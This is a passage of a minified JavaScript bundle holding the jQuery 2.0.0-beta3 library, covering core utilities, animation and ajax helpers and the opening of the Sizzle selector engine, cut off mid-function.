/*
 * JSMin
 * Javascript Compressor
 * http://www.crockford.com/
 * http://www.smallsharptools.com/Projects/Packer/
*/

// js/vendor/jquery2b3.js

(function(e,t){function n(e){var t=e.length,n=ot.type(e);return ot.isWindow(e)?!1:1===e.nodeType&&t?!0:"array"===n||"function"!==n&&(0===t||"number"==typeof t&&t>0&&t-1 in e)}function r(e){var t=ht[e]={};return ot.each(e.match(at)||[],function(e,n){t[n]=!0}),t}function i(){Object.defineProperty(this.cache={},0,{get:function(){return{}}}),this.expando=ot.expando+Math.random()}function o(e,n,r){var i;if(r===t&&1===e.nodeType)if(i="data-"+n.replace(vt,"-$1").toLowerCase(),r=e.getAttribute(i),"string"==typeof r){try{r="true"===r?!0:"false"===r?!1:"null"===r?null:+r+""===r?+r:yt.test(r)?JSON.parse(r):r}catch(o){}gt.set(e,n,r)}else r=t;return r}function s(){return!0}function a(){return!1}function u(){try{return X.activeElement}catch(e){}}function c(e,t){for(;(e=e[t])&&1!==e.nodeType;);return e}function l(e,t,n){if(ot.isFunction(t))return ot.grep(e,function(e,r){return!!t.call(e,r,e)!==n});if(t.nodeType)return ot.grep(e,function(e){return e===t!==n});if("string"==typeof t){if(jt.test(t))return ot.filter(t,e,n);t=ot.filter(t,e)}return ot.grep(e,function(e){return tt.call(t,e)>=0!==n})}function f(e,t){return e.getElementsByTagName(t)[0]||e.appendChild(e.ownerDocument.createElement(t))}function p(e){var t=e.getAttributeNode("type");return e.type=(t&&t.specified)+"/"+e.type,e}function d(e){var t=Rt.exec(e.type);return t?e.type=t[1]:e.removeAttribute("type"),e}function h(e,t){for(var n=e.length,r=0;n>r;r++)mt.set(e[r],"globalEval",!t||mt.get(t[r],"globalEval"))}function g(e,t){var n,r,i,o,s,a,u,c;if(1===t.nodeType){if(mt.hasData(e)&&(o=mt.access(e),s=ot.extend({},o),c=o.events,mt.set(t,s),c)){delete s.handle,s.events={};for(i in c)for(n=0,r=c[i].length;r>n;n++)ot.event.add(t,i,c[i][n])}gt.hasData(e)&&(a=gt.access(e),u=ot.extend({},a),gt.set(t,u))}}function m(e,n){var r=e.getElementsByTagName?e.getElementsByTagName(n||"*"):e.querySelectorAll?e.querySelectorAll(n||"*"):[];return n===t||n&&ot.nodeName(e,n)?ot.merge([e],r):r}function y(e,t){var n=t.nodeName.toLowerCase();"input"===n&&Ft.test(e.type)?t.checked=e.checked:("input"===n||"textarea"===n)&&(t.defaultValue=e.defaultValue)}function v(e,t){if(t in e)return t;for(var n=t.charAt(0).toUpperCase()+t.slice(1),r=t,i=Kt.length;i--;)if(t=Kt[i]+n,t in e)return t;return r}function x(e,t){return e=t||e,"none"===ot.css(e,"display")||!ot.contains(e.ownerDocument,e)}function b(t){return e.getComputedStyle(t,null)}function w(e,t){for(var n,r,i,o=[],s=0,a=e.length;a>s;s++)r=e[s],r.style&&(o[s]=mt.get(r,"olddisplay"),n=r.style.display,t?(o[s]||"none"!==n||(r.style.display=""),""===r.style.display&&x(r)&&(o[s]=mt.access(r,"olddisplay",k(r.nodeName)))):o[s]||(i=x(r),(n&&"none"!==n||!i)&&mt.set(r,"olddisplay",i?n:ot.css(r,"display"))));for(s=0;a>s;s++)r=e[s],r.style&&(t&&"none"!==r.style.display&&""!==r.style.display||(r.style.display=t?o[s]||"":"none"));return e}function T(e,t,n){var r=Xt.exec(t);return r?Math.max(0,r[1]-(n||0))+(r[2]||"px"):t}function C(e,t,n,r,i){for(var o=n===(r?"border":"content")?4:"width"===t?1:0,s=0;4>o;o+=2)"margin"===n&&(s+=ot.css(e,n+Qt[o],!0,i)),r?("content"===n&&(s-=ot.css(e,"padding"+Qt[o],!0,i)),"margin"!==n&&(s-=ot.css(e,"border"+Qt[o]+"Width",!0,i))):(s+=ot.css(e,"padding"+Qt[o],!0,i),"padding"!==n&&(s+=ot.css(e,"border"+Qt[o]+"Width",!0,i)));return s}function N(e,t,n){var r=!0,i="width"===t?e.offsetWidth:e.offsetHeight,o=b(e),s=ot.support.boxSizing&&"border-box"===ot.css(e,"boxSizing",!1,o);if(0>=i||null==i){if(i=$t(e,t,o),(0>i||null==i)&&(i=e.style[t]),Ut.test(i))return i;r=s&&(ot.support.boxSizingReliable||i===e.style[t]),i=parseFloat(i)||0}return i+C(e,t,n||(s?"border":"content"),r,o)+"px"}function k(e){var t=X,n=Vt[e];return n||(n=E(e,t),"none"!==n&&n||(It=(It||ot("<iframe frameborder='0' width='0' height='0'/>").css("cssText","display:block !important")).appendTo(t.documentElement),t=(It[0].contentWindow||It[0].contentDocument).document,t.write("<!doctype html><html><body>"),t.close(),n=E(e,t),It.detach()),Vt[e]=n),n}function E(e,t){var n=ot(t.createElement(e)).appendTo(t.body),r=ot.css(n[0],"display");return n.remove(),r}function S(e,t,n,r){var i;if(ot.isArray(t))ot.each(t,function(t,i){n||en.test(e)?r(e,i):S(e+"["+("object"==typeof i?t:"")+"]",i,n,r)});else if(n||"object"!==ot.type(t))r(e,t);else for(i in t)S(e+"["+i+"]",t[i],n,r)}function j(e){return function(t,n){"string"!=typeof t&&(n=t,t="*");var r,i=0,o=t.toLowerCase().match(at)||[];if(ot.isFunction(n))for(;r=o[i++];)"+"===r[0]?(r=r.slice(1)||"*",(e[r]=e[r]||[]).unshift(n)):(e[r]=e[r]||[]).push(n)}}function D(e,n,r,i){function o(u){var c;return s[u]=!0,ot.each(e[u]||[],function(e,u){var l=u(n,r,i);return"string"!=typeof l||a||s[l]?a?!(c=l):t:(n.dataTypes.unshift(l),o(l),!1)}),c}var s={},a=e===vn;return o(n.dataTypes[0])||!s["*"]&&o("*")}function A(e,n){var r,i,o=ot.ajaxSettings.flatOptions||{};for(r in n)n[r]!==t&&((o[r]?e:i||(i={}))[r]=n[r]);return i&&ot.extend(!0,e,i),e}function L(e,n,r){for(var i,o,s,a,u=e.contents,c=e.dataTypes;"*"===c[0];)c.shift(),i===t&&(i=e.mimeType||n.getResponseHeader("Content-Type"));if(i)for(o in u)if(u[o]&&u[o].test(i)){c.unshift(o);break}if(c[0]in r)s=c[0];else{for(o in r){if(!c[0]||e.converters[o+" "+c[0]]){s=o;break}a||(a=o)}s=s||a}return s?(s!==c[0]&&c.unshift(s),r[s]):t}function q(e,t,n,r){var i,o,s,a,u,c={},l=e.dataTypes.slice();if(l[1])for(s in e.converters)c[s.toLowerCase()]=e.converters[s];for(o=l.shift();o;)if(e.responseFields[o]&&(n[e.responseFields[o]]=t),!u&&r&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),u=o,o=l.shift())if("*"===o)o=u;else if("*"!==u&&u!==o){if(s=c[u+" "+o]||c["* "+o],!s)for(i in c)if(a=i.split(" "),a[1]===o&&(s=c[u+" "+a[0]]||c["* "+a[0]])){s===!0?s=c[i]:c[i]!==!0&&(o=a[0],l.unshift(a[1]));break}if(s!==!0)if(s&&e["throws"])t=s(t);else try{t=s(t)}catch(f){return{state:"parsererror",error:s?f:"No conversion from "+u+" to "+o}}}return{state:"success",data:t}}function H(){return setTimeout(function(){Sn=t}),Sn=ot.now()}function O(e,t){ot.each(t,function(t,n){for(var r=(Hn[t]||[]).concat(Hn["*"]),i=0,o=r.length;o>i;i++)if(r[i].call(e,t,n))return})}function F(e,t,n){var r,i,o=0,s=qn.length,a=ot.Deferred().always(function(){delete u.elem}),u=function(){if(i)return!1;for(var t=Sn||H(),n=Math.max(0,c.startTime+c.duration-t),r=n/c.duration||0,o=1-r,s=0,u=c.tweens.length;u>s;s++)c.tweens[s].run(o);return a.notifyWith(e,[c,o,n]),1>o&&u?n:(a.resolveWith(e,[c]),!1)},c=a.promise({elem:e,props:ot.extend({},t),opts:ot.extend(!0,{specialEasing:{}},n),originalProperties:t,originalOptions:n,startTime:Sn||H(),duration:n.duration,tweens:[],createTween:function(t,n){var r=ot.Tween(e,c.opts,t,n,c.opts.specialEasing[t]||c.opts.easing);return c.tweens.push(r),r},stop:function(t){var n=0,r=t?c.tweens.length:0;if(i)return this;for(i=!0;r>n;n++)c.tweens[n].run(1);return t?a.resolveWith(e,[c,t]):a.rejectWith(e,[c,t]),this}}),l=c.props;for(P(l,c.opts.specialEasing);s>o;o++)if(r=qn[o].call(c,e,l,c.opts))return r;return O(c,l),ot.isFunction(c.opts.start)&&c.opts.start.call(e,c),ot.fx.timer(ot.extend(u,{elem:e,anim:c,queue:c.opts.queue})),c.progress(c.opts.progress).done(c.opts.done,c.opts.complete).fail(c.opts.fail).always(c.opts.always)}function P(e,t){var n,r,i,o,s;for(n in e)if(r=ot.camelCase(n),i=t[r],o=e[n],ot.isArray(o)&&(i=o[1],o=e[n]=o[0]),n!==r&&(e[r]=o,delete e[n]),s=ot.cssHooks[r],s&&"expand"in s){o=s.expand(o),delete e[r];for(n in o)n in e||(e[n]=o[n],t[n]=i)}else t[r]=i}function M(e,t,n){var r,i,o,s,a,u,c,l,f,p=this,d=e.style,h={},g=[],m=e.nodeType&&x(e);n.queue||(l=ot._queueHooks(e,"fx"),null==l.unqueued&&(l.unqueued=0,f=l.empty.fire,l.empty.fire=function(){l.unqueued||f()}),l.unqueued++,p.always(function(){p.always(function(){l.unqueued--,ot.queue(e,"fx").length||l.empty.fire()})})),1===e.nodeType&&("height"in t||"width"in t)&&(n.overflow=[d.overflow,d.overflowX,d.overflowY],"inline"===ot.css(e,"display")&&"none"===ot.css(e,"float")&&(d.display="inline-block")),n.overflow&&(d.overflow="hidden",p.always(function(){d.overflow=n.overflow[0],d.overflowX=n.overflow[1],d.overflowY=n.overflow[2]}));for(r in t)if(o=t[r],Dn.exec(o)){if(delete t[r],u=u||"toggle"===o,o===(m?"hide":"show"))continue;g.push(r)}if(s=g.length){a=mt.get(e,"fxshow")||mt.access(e,"fxshow",{}),"hidden"in a&&(m=a.hidden),u&&(a.hidden=!m),m?ot(e).show():p.done(function(){ot(e).hide()}),p.done(function(){var t;mt.remove(e,"fxshow");for(t in h)ot.style(e,t,h[t])});for(r=0;s>r;r++)i=g[r],c=p.createTween(i,m?a[i]:0),h[i]=a[i]||ot.style(e,i),i in a||(a[i]=c.start,m&&(c.end=c.start,c.start="width"===i||"height"===i?1:0))}}function R(e,t,n,r,i){return new R.prototype.init(e,t,n,r,i)}function W(e,t){var n,r={height:e},i=0;for(t=t?1:0;4>i;i+=2-t)n=Qt[i],r["margin"+n]=r["padding"+n]=e;return t&&(r.opacity=r.width=e),r}function B(e){return ot.isWindow(e)?e:9===e.nodeType&&e.defaultView}var $,I,z=typeof t,_=e.location,X=e.document,U=X.documentElement,Y=e.jQuery,V=e.$,G={},J=[],Q="2.0.0-beta3",K=J.concat,Z=J.push,et=J.slice,tt=J.indexOf,nt=G.toString,rt=G.hasOwnProperty,it=Q.trim,ot=function(e,t){return new ot.fn.init(e,t,$)},st=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,at=/\S+/g,ut=/^(?:(<[\w\W]+>)[^>]*|#([\w-]*))$/,ct=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,lt=/^-ms-/,ft=/-([\da-z])/gi,pt=function(e,t){return t.toUpperCase()},dt=function(){X.removeEventListener("DOMContentLoaded",dt,!1),e.removeEventListener("load",dt,!1),ot.ready()};ot.fn=ot.prototype={jquery:Q,constructor:ot,init:function(e,n,r){var i,o;if(!e)return this;if("string"==typeof e){if(i="<"===e.charAt(0)&&">"===e.charAt(e.length-1)&&e.length>=3?[null,e,null]:ut.exec(e),!i||!i[1]&&n)return!n||n.jquery?(n||r).find(e):this.constructor(n).find(e);if(i[1]){if(n=n instanceof ot?n[0]:n,ot.merge(this,ot.parseHTML(i[1],n&&n.nodeType?n.ownerDocument||n:X,!0)),ct.test(i[1])&&ot.isPlainObject(n))for(i in n)ot.isFunction(this[i])?this[i](n[i]):this.attr(i,n[i]);return this}return o=X.getElementById(i[2]),o&&o.parentNode&&(this.length=1,this[0]=o),this.context=X,this.selector=e,this}return e.nodeType?(this.context=this[0]=e,this.length=1,this):ot.isFunction(e)?r.ready(e):(e.selector!==t&&(this.selector=e.selector,this.context=e.context),ot.makeArray(e,this))},selector:"",length:0,toArray:function(){return et.call(this)},get:function(e){return null==e?this.toArray():0>e?this[this.length+e]:this[e]},pushStack:function(e){var t=ot.merge(this.constructor(),e);return t.prevObject=this,t.context=this.context,t},each:function(e,t){return ot.each(this,e,t)},ready:function(e){return ot.ready.promise().done(e),this},slice:function(){return this.pushStack(et.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(0>e?t:0);return this.pushStack(n>=0&&t>n?[this[n]]:[])},map:function(e){return this.pushStack(ot.map(this,function(t,n){return e.call(t,n,t)}))},end:function(){return this.prevObject||this.constructor(null)},push:Z,sort:[].sort,splice:[].splice},ot.fn.init.prototype=ot.fn,ot.extend=ot.fn.extend=function(){var e,n,r,i,o,s,a=arguments[0]||{},u=1,c=arguments.length,l=!1;for("boolean"==typeof a&&(l=a,a=arguments[1]||{},u=2),"object"==typeof a||ot.isFunction(a)||(a={}),c===u&&(a=this,--u);c>u;u++)if(null!=(e=arguments[u]))for(n in e)r=a[n],i=e[n],a!==i&&(l&&i&&(ot.isPlainObject(i)||(o=ot.isArray(i)))?(o?(o=!1,s=r&&ot.isArray(r)?r:[]):s=r&&ot.isPlainObject(r)?r:{},a[n]=ot.extend(l,s,i)):i!==t&&(a[n]=i));return a},ot.extend({expando:"jQuery"+(Q+Math.random()).replace(/\D/g,""),noConflict:function(t){return e.$===ot&&(e.$=V),t&&e.jQuery===ot&&(e.jQuery=Y),ot},isReady:!1,readyWait:1,holdReady:function(e){e?ot.readyWait++:ot.ready(!0)},ready:function(e){(e===!0?--ot.readyWait:ot.isReady)||(ot.isReady=!0,e!==!0&&--ot.readyWait>0||(I.resolveWith(X,[ot]),ot.fn.trigger&&ot(X).trigger("ready").off("ready")))},isFunction:function(e){return"function"===ot.type(e)},isArray:Array.isArray,isWindow:function(e){return null!=e&&e===e.window},isNumeric:function(e){return!isNaN(parseFloat(e))&&isFinite(e)},type:function(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?G[nt.call(e)]||"object":typeof e},isPlainObject:function(e){if("object"!==ot.type(e)||e.nodeType||ot.isWindow(e))return!1;try{if(e.constructor&&!rt.call(e.constructor.prototype,"isPrototypeOf"))return!1}catch(t){return!1}return!0},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},error:function(e){throw Error(e)},parseHTML:function(e,t,n){if(!e||"string"!=typeof e)return null;"boolean"==typeof t&&(n=t,t=!1),t=t||X;var r=ct.exec(e),i=!n&&[];return r?[t.createElement(r[1])]:(r=ot.buildFragment([e],t,i),i&&ot(i).remove(),ot.merge([],r.childNodes))},parseJSON:JSON.parse,parseXML:function(e){var n,r;if(!e||"string"!=typeof e)return null;try{r=new DOMParser,n=r.parseFromString(e,"text/xml")}catch(i){n=t}return(!n||n.getElementsByTagName("parsererror").length)&&ot.error("Invalid XML: "+e),n},noop:function(){},globalEval:function(e){var t,n=eval;e=ot.trim(e),e&&(1===e.indexOf("use strict")?(t=X.createElement("script"),t.text=e,X.head.appendChild(t).parentNode.removeChild(t)):n(e))},camelCase:function(e){return e.replace(lt,"ms-").replace(ft,pt)},nodeName:function(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()},each:function(e,t,r){var i,o=0,s=e.length,a=n(e);if(r){if(a)for(;s>o&&(i=t.apply(e[o],r),i!==!1);o++);else for(o in e)if(i=t.apply(e[o],r),i===!1)break}else if(a)for(;s>o&&(i=t.call(e[o],o,e[o]),i!==!1);o++);else for(o in e)if(i=t.call(e[o],o,e[o]),i===!1)break;return e},trim:function(e){return null==e?"":it.call(e)},makeArray:function(e,t){var r=t||[];return null!=e&&(n(Object(e))?ot.merge(r,"string"==typeof e?[e]:e):Z.call(r,e)),r},inArray:function(e,t,n){return null==t?-1:tt.call(t,e,n)},merge:function(e,n){var r=n.length,i=e.length,o=0;if("number"==typeof r)for(;r>o;o++)e[i++]=n[o];else for(;n[o]!==t;)e[i++]=n[o++];return e.length=i,e},grep:function(e,t,n){var r,i=[],o=0,s=e.length;for(n=!!n;s>o;o++)r=!!t(e[o],o),n!==r&&i.push(e[o]);return i},map:function(e,t,r){var i,o=0,s=e.length,a=n(e),u=[];if(a)for(;s>o;o++)i=t(e[o],o,r),null!=i&&(u[u.length]=i);else for(o in e)i=t(e[o],o,r),null!=i&&(u[u.length]=i);return K.apply([],u)},guid:1,proxy:function(e,n){var r,i,o;return"string"==typeof n&&(r=e[n],n=e,e=r),ot.isFunction(e)?(i=et.call(arguments,2),o=function(){return e.apply(n||this,i.concat(et.call(arguments)))},o.guid=e.guid=e.guid||ot.guid++,o):t},access:function(e,n,r,i,o,s,a){var u=0,c=e.length,l=null==r;if("object"===ot.type(r)){o=!0;for(u in r)ot.access(e,n,u,r[u],!0,s,a)}else if(i!==t&&(o=!0,ot.isFunction(i)||(a=!0),l&&(a?(n.call(e,i),n=null):(l=n,n=function(e,t,n){return l.call(ot(e),n)})),n))for(;c>u;u++)n(e[u],r,a?i:i.call(e[u],u,n(e[u],r)));return o?e:l?n.call(e):c?n(e[0],r):s},now:Date.now,swap:function(e,t,n,r){var i,o,s={};for(o in t)s[o]=e.style[o],e.style[o]=t[o];i=n.apply(e,r||[]);for(o in t)e.style[o]=s[o];return i}}),ot.ready.promise=function(t){return I||(I=ot.Deferred(),"complete"===X.readyState?setTimeout(ot.ready):(X.addEventListener("DOMContentLoaded",dt,!1),e.addEventListener("load",dt,!1))),I.promise(t)},ot.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(e,t){G["[object "+t+"]"]=t.toLowerCase()}),$=ot(X),function(e,t){function n(e){return xt.test(e+"")}function r(){var e,t=[];return e=function(n,r){return t.push(n+=" ")>E.cacheLength&&delete e[t.shift()],e[n]=r}}function i(e){return e[B]=!0,e}function o(e){var t=H.createElement("div");try{return!!e(t)}catch(n){return!1}finally{t=null}}function s(e,t,n,r){var i,o,s,a,u,c,l,f,p,g;if((t?t.ownerDocument||t:$)!==H&&q(t),t=t||H,n=n||[],!e||"string"!=typeof e)return n;if(1!==(a=t.nodeType)&&9!==a)return[];if(F&&!r){if(i=bt.exec(e))if(s=i[1]){if(9===a){if(o=t.getElementById(s),!o||!o.parentNode)return n;if(o.id===s)return n.push(o),n}else if(t.ownerDocument&&(o=t.ownerDocument.getElementById(s))&&W(t,o)&&o.id===s)return n.push(o),n}else{if(i[2])return tt.apply(n,t.getElementsByTagName(e)),n;if((s=i[3])&&I.getElementsByClassName&&t.getElementsByClassName)return tt.apply(n,t.getElementsByClassName(s)),n}if(I.qsa&&(!P||!P.test(e))){if(f=l=B,p=t,g=9===a&&e,1===a&&"object"!==t.nodeName.toLowerCase()){for(c=d(e),(l=t.getAttribute("id"))?f=l.replace(Ct,"\\$&"):t.setAttribute("id",f),f="[id='"+f+"'] ",u=c.length;u--;)c[u]=f+h(c[u]);p=ht.test(e)&&t.parentNode||t,g=c.join(",")}if(g)try{return tt.apply(n,p.querySelectorAll(g)),n}catch(m){}finally{l||t.removeAttribute("id")}}}return T(e.replace(ft,"$1"),t,n,r)}function a(e,t){var n=t&&e,r=n&&(~t.sourceIndex||Q)-(~e.sourceIndex||Q);if(r)return r;if(n)for(;n=n.nextSibling;)if(n===t)return-1;return e?1:-1}function u(e,n,r){var i;return r?t:(i=e.getAttributeNode(n))&&i.specified?i.value:e[n]===!0?n.toLowerCase():null}function c(e,n,r){var i;return r?t:i=e.getAttribute(n,"type"===n.toLowerCase()?1:2)}function l(e){return function(t){var n=t.nodeName.toLowerCase();return"input"===n&&t.type===e}}function f(e){return function(t){var n=t.nodeName.toLowerCase();return("input"===n||"button"===n)&&t.type===e}}function p(e){return i(function(t){return t=+t,i(function(n,r){for(var i,o=e([],n.length,t),s=o.length;s--;)n[i=o[s]]&&(n[i]=!(r[i]=n[i]))})})}function d(e,t){var n,r,i,o,a,u,c,l=U[e+" "];if(l)return t?0:l.slice(0);for(a=e,u=[],c=E.preFilter;a;){(!n||(r=pt.exec(a)))&&(r&&(a=a.slice(r[0].length)||a),u.push(i=[])),n=!1,(r=dt.exec(a))&&(n=r.shift(),i.push({value:n,type:r[0].replace(ft," ")}),a=a.slice(n.length));for(o in E.filter)!(r=vt[o].exec(a))||c[o]&&!(r=c[o](r))||(n=r.shift(),i.push({value:n,type:o,matches:r}),a=a.slice(n.length));if(!n)break}return t?a.length:a?s.error(e):U(e,u).slice(0)}function h(e){for(var t=0,n=e.length,r="";n>t;t++)r+=e[t].value;return r}function g(e,t,n){var r=t.dir,i=n&&"parentNode"===r,o=_++;return t.first?function(t,n,o){for(;t=t[r];)if(1===t.nodeType||i)return e(t,n,o)}:function(t,n,s){var a,u,c,l=z+" "+o;if(s){for(;t=t[r];)if((1===t.nodeType||i)&&e(t,n,s))return!0}else for(;t=t[r];)if(1===t.nodeType||i)if(c=t[B]||(t[B]={}),(u=c[r])&&u[0]===l){if((a=u[1])===!0||a===k)return a===!0}else if(u=c[r]=[l],u[1]=e(t,n,s)||k,u[1]===!0)return!0}}function m(e){return e.length>1?function(t,n,r){for(var i=e.length;i--;)if(!e[i](t,n,r))return!1;return!0}:e[0]}function y(e,t,n,r,i){for(var o,s=[],a=0,u=e.length,c=null!=t;u>a;a++)(o=e[a])&&(!n||n(o,r,i))&&(s.push(o),c&&t.push(a));return s}function v(e,t,n,r,o,s){return r&&!r[B]&&(r=v(r)),o&&!o[B]&&(o=v(o,s)),i(function(i,s,a,u){var c,l,f,p=[],d=[],h=s.length,g=i||w(t||"*",a.nodeType?[a]:a,[]),m=!e||!i&&t?g:y(g,p,e,a,u),v=n?o||(i?e:h||r)?[]:s:m;if(n&&n(m,v,a,u),r)for(c=y(v,d),r(c,[],a,u),l=c.length;l--;)(f=c[l])&&(v[d[l]]=!(m[d[l]]=f));if(i){if(o||e){if(o){for(c=[],l=v.length;l--;)(f=v[l])&&c.push(m[l]=f);o(null,v=[],c,u)}for(l=v.length;l--;)(f=v[l])&&(c=o?rt.call(i,f):p[l])>-1&&(i[c]=!(s[c]=f))}}else v=y(v===s?v.splice(h,v.length):v),o?o(null,s,v,u):tt.apply(s,v)})}function x(e){for(var t,n,r,i=e.length,o=E.relative[e[0].type],s=o||E.relative[" "],a=o?1:0,u=g(function(e){return e===t},s,!0),c=g(function(e){return rt.call(t,e)>-1},s,!0),l=[function(e,n,r){return!o&&(r||n!==A)||((t=n).nodeType?u(e,n,r):c(e,n,r))}];i>a;a++)if(n=E.relative[e[a].type])l=[g(m(l),n)];else{if(n=E.filter[e[a].type].apply(null,e[a].matches),n[B]){for(r=++a;i>r&&!E.relative[e[r].type];r++);return v(a>1&&m(l),a>1&&h(e.slice(0,a-1)).replace(ft,"$1"),n,r>a&&x(e.slice(a,r)),i>r&&x(e=e.slice(r)),i>r&&h(e))}l.push(n)}return m(l)}function b(e,t){var n=0,r=t.length>0,o=e.length>0,a=function(i,a,u,c,l){var f,p,d,h=[],g=0,m="0",v=i&&[],x=null!=l,b=A,w=i||o&&E.find.TAG("*",l&&a.parentNode||a),T=z+=null==b?1:Math.random()||.1;for(x&&(A=a!==H&&a,k=n);null!=(f=w[m]);m++){if(o&&f){for(p=0;d=e[p++];)if(d(f,a,u)){c.push(f);break}x&&(z=T,k=++n)}r&&((f=!d&&f)&&g--,i&&v.push(f))}if(g+=m,r&&m!==g){for(p=0;d=t[p++];)d(v,h,a,u);if(i){if(g>0)for(;m--;)v[m]||h[m]||(h[m]=Z.call(c));h=y(h)}tt.apply(c,h),x&&!i&&h.length>0&&g+t.length>1&&s.uniqueSort(c)}return x&&(z=T,A=b),v};return r?i(a):a}function w(e,t,n){for(var r=0,i=t.length;i>r;r++)s(e,t[r],n);return n}function T(e,t,n,r){var i,o,s,a,u,c=d(e);if(!r&&1===c.length){if(o=c[0]=c[0].slice(0),o.length>2&&"ID"===(s=o[0]).type&&9===t.nodeType&&F&&E.relative[o[1].type]){if(t=(E.find.ID(s.matches[0].replace(Nt,kt),t)||[])[0],!t)return n;e=e.slice(o.shift().value.length)}for(i=vt.needsContext.test(e)?0:o.length;i--&&(s=o[i],!E.relative[a=s.type]);)if((u=E.find[a])&&(r=u(s.matches[0].replace(Nt,kt),ht.test(o[0].type)&&t.parentNode||t))){if(o.splice(i,1),e=r.length&&h(o),!e)return tt.apply(n,r),n;break}}return D(e,c)(r,t,!F,n,ht.test(e)),n}function C(){}var N,k,E,S,j,D,A,L,q,H,O,F,P,M,R,W,B="sizzle"+-new Date,$=e.document,I={},z=0,_=0,X=r(),U=r(),Y=r(),V=!1,G=function(){return 0},J=typeof t,Q=1<<31,K=[],Z=K.pop,et=K.push,tt=K.push,nt=K.slice,rt=K.indexOf||function(e){for(var t=0,n=this.length;n>t;t++)if(this[t]===e)return t;return-1},it="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",st="[\\x20\\t\\r\\n\\f]",at="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",ut=at.replace("w","w#"),ct="\\["+st+"*("+at+")"+st+"*(?:([*^$|!~]?=)"+st+"*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|("+ut+")|)|)"+st+"*\\]",lt=":("+at+")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|"+ct.replace(3,8)+")*)|.*)\\)|)",ft=RegExp("^"+st+"+|((?:^|[^\\\\])(?:\\\\.)*)"+st+"+$","g"),pt=RegExp("^"+st+"*,"+st+"*"),dt=RegExp("^"+st+"*([>+~]|"+st+")"+st+"*"),ht=RegExp(st+"*[+~]"),gt=RegExp("="+st+"*([^\\]'\"]*)"+st+"*\\]","g"),mt=RegExp(lt),yt=RegExp("^"+ut+"$"),vt={ID:RegExp("^#("+at+")"),CLASS:RegExp("^\\.("+at+")"),NAME:RegExp("^\\[name=['\"]?("+at+")['\"]?\\]"),TAG:RegExp("^("+at.replace("w","w*")+")"),ATTR:RegExp("^"+ct),PSEUDO:RegExp("^"+lt),CHILD:RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+st+"*(even|odd|(([+-]|)(\\d*)n|)"+st+"*(?:([+-]|)"+st+"*(\\d+)|))"+st+"*\\)|)","i"),"boolean":RegExp("^(?:"+it+")$","i"),needsContext:RegExp("^"+st+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+st+"*((?:-\\d)?\\d*)"+st+"*\\)|)(?=[^-]|$)","i")},xt=/^[^{]+\{\s*\[native \w/,bt=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,wt=/^(?:input|select|textarea|button)$/i,Tt=/^h\d$/i,Ct=/'|\\/g,Nt=/\\([\da-fA-F]{1,6}[\x20\t\r\n\f]?|.)/g,kt=function(e,t){var n="0x"+t-65536;return n!==n?t:0>n?String.fromCharCode(n+65536):String.fromCharCode(55296|n>>10,56320|1023&n)};try{tt.apply(K=nt.call($.childNodes),$.childNodes),K[$.childNodes.length].nodeType}catch(Et){tt={apply:K.length?function(e,t){et.apply(e,nt.call(t))}:function(e,t){for(var n=e.length,r=0;e[n++]=t[r++];);e.length=n-1}}}j=s.isXML=function(e){var t=e&&(e.ownerDocument||e).documentElement;return t?"HTML"!==t.nodeName:!1},q=s.setDocument=function(e){var r=e?e.ownerDocument||e:$;return r!==H&&9===r.nodeType&&r.documentElement?(H=r,O=r.documentElement,F=!j(r),I.getElementsByTagName=o(function(e){return e.appendChild(r.createComment("")),!e.getElementsByTagName("*").length}),I.attributes=o(function(e){return e.className="i",!e.getAttribute("className")}),I.getElementsByClassName=o(function(e){return e.innerHTML="<div class='a'></div><div class='a i'></div>",e.firstChild.className="i",2===e.getElementsByClassName("i").length}),I.getByName=o(function(e){e.id=B+0,e.appendChild(H.createElement("a")).setAttribute("name",B),e.appendChild(H.createElement("i")).setAttribute("name",B),O.appendChild(e);var t=r.getElementsByName&&r.getElementsByName(B).length===2+r.getElementsByName(B+0).length;return O.removeChild(e),t}),I.sortDetached=o(function(e){return 1&e.compareDocumentPosition(H.createElement("div"))}),I.getByName?(E.find.ID=function(e,t){if(typeof t.getElementById!==J&&F){var n=t.getElementById(e);return n&&n.parentNode?[n]:[]}},E.filter.ID=function(e){var t=e.replace(Nt,kt);return function(e){return e.getAttribute("id")===t}}):(E.find.ID=function(e,n){if(typeof n.getElementById!==J&&F){var r=n.getElementById(e);return r?r.id===e||typeof r.getAttributeNode!==J&&r.getAttributeNode("id").value===e?[r]:t:[]}},E.filter.ID=function(e){var t=e.replace(Nt,kt);return function(e){var n=typeof e.getAttributeNode!==J&&e.getAttributeNode("id");return n&&n.value===t}}),E.find.TAG=I.getElementsByTagName?function(e,n){return typeof n.getElementsByTagName!==J?n.getElementsByTagName(e):t}:function(e,t){var n,r=[],i=0,o=t.getElementsByTagName(e);if("*"===e){for(;n=o[i++];)1===n.nodeType&&r.push(n);return r}return o},E.find.NAME=I.getByName&&function(e,n){return typeof n.getElementsByName!==J?n.getElementsByName(name):t},E.find.CLASS=I.getElementsByClassName&&function(e,n){return typeof n.getElementsByClassName!==J&&F?n.getElementsByClassName(e):t},M=[],P=[],(I.qsa=n(r.querySelectorAll))&&(o(function(e){e.innerHTML="<select><option selected=''></option></select>",e.querySelectorAll("[selected]").length||P.push("\\["+st+"*(?:value|"+it+")"),e.querySelectorAll(":checked").length||P.push(":checked")}),o(function(e){var 